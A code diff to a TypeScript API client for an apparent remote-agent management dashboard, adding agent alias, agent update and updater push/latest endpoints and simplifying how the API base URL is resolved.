@@ -11,11 +11,7 @@ function resolveApiBaseUrl(): string {
   if (runtimeApiUrl) return runtimeApiUrl;
 
   if (typeof window !== 'undefined') {
-    const host = window.location.hostname;
-    const isLocalhost = host === 'localhost' || host === '127.0.0.1';
-    if (!isLocalhost) {
-      return `${window.location.protocol}//${window.location.host}`;
-    }
+    return `${window.location.protocol}//${window.location.host}`;
   }
 
   return (import.meta as any)?.env?.VITE_API_URL || 'http://localhost:8080';
@@ -38,6 +34,7 @@ const API_ENDPOINTS = {
     details: (id: string) => `/api/agents/${id}`,
     search: '/api/agents/search',
     performance: (id: string) => `/api/agents/${id}/performance`,
+    alias: (id: string) => `/api/agents/${id}/alias`,
     execute: (id: string) => `/api/agents/${id}/execute`,
     commandHistory: (id: string) => `/api/agents/${id}/commands/history`,
     files: (id: string) => `/api/agents/${id}/files`,
@@ -59,6 +56,11 @@ const API_ENDPOINTS = {
     registryToggle: '/api/system/registry/toggle',
     agentStatus: '/api/system/agent/status',
     agentAdmin: '/api/system/agent/admin',
+    updateAgent: '/api/system/update-agent',
+  },
+  updater: {
+    latest: '/api/updater/latest',
+    push: '/api/updater/push',
   },
   // Activity
   activity: '/api/activity',
@@ -422,6 +424,13 @@ class ApiClient {
     return this.request(API_ENDPOINTS.agents.details(agentId));
   }
 
+  async setAgentAlias(agentId: string, alias: string): Promise<ApiResponse<{ agent_id: string; alias: string }>> {
+    return this.request(API_ENDPOINTS.agents.alias(agentId), {
+      method: 'POST',
+      body: JSON.stringify({ alias }),
+    });
+  }
+
   async searchAgents(params: {
     q?: string;
     status?: string;
@@ -557,6 +566,11 @@ class ApiClient {
   async getSystemInfo(): Promise<ApiResponse> {
     return this.request(API_ENDPOINTS.system.info);
   }
+  async updateAgent(): Promise<ApiResponse> {
+    return this.request(API_ENDPOINTS.system.updateAgent, {
+      method: 'POST',
+    });
+  }
 
   // Activity Methods
   async getActivity(type: string = 'all', limit: number = 50): Promise<ApiResponse<{ activities: ActivityEvent[] }>> {
@@ -587,6 +601,15 @@ class ApiClient {
   async resetSettings(): Promise<ApiResponse> {
     return this.request(API_ENDPOINTS.settings.reset, {
       method: 'POST',
+    });
+  }
+  async getUpdaterLatest(): Promise<ApiResponse<{ version: string; md5: string; download_url: string; last_push: string; size: number }>> {
+    return this.request(API_ENDPOINTS.updater.latest);
+  }
+  async pushUpdater(code: string, version?: string): Promise<ApiResponse<{ version: string; md5: string; download_url: string; last_push: string }>> {
+    return this.request(API_ENDPOINTS.updater.push, {
+      method: 'POST',
+      body: JSON.stringify({ code, version }),
     });
   }
 
